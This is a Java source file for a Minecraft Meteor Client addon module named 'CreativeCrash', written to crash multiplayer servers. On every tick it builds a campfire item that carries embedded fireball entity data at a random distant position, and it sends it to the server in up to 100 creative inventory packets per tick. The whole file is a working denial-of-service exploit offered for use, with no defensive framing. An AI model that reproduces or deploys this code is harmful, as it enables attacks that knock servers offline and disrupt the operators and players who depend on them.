package de.frxstdev.crashaddon.modules;

import de.frxstdev.crashaddon.CrasherUtils;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.NbtComponent;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtDouble;
import net.minecraft.nbt.NbtList;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.util.math.Vec3d;

import java.util.Random;

public class CreativeCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount")
        .description("Packets per tick")
        .defaultValue(15)
        .min(1)
        .sliderMax(100)
        .build());

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable")
        .description("Disables module on kick.")
        .defaultValue(true)
        .build());

    public CreativeCrash() {
        super(CrasherUtils.CATEGORY, "creative-crash", "");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (!mc.player.getAbilities().creativeMode) {
            error("its literally called creative crash why are you trying this in survival");
            toggle();
        }

        Vec3d pos = pickRandomPos();
        NbtCompound tag = new NbtCompound();
        NbtList list = new NbtList();
        ItemStack the = new ItemStack(Items.CAMPFIRE);
        list.add(NbtDouble.of(pos.x));
        list.add(NbtDouble.of(pos.y));
        list.add(NbtDouble.of(pos.z));
        //idk
        tag.putString("id", "minecraft:small_fireball");
        tag.put("Pos", list);
        the.set(DataComponentTypes.BLOCK_ENTITY_DATA, NbtComponent.of(tag));
        for (int i = 0; i < amount.get(); i++) {
            mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(1, the));
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }

    private Vec3d pickRandomPos() {
        return new Vec3d(new Random().nextInt(0xFFFFFF), 255, new Random().nextInt(0xFFFFFF));
    }
}
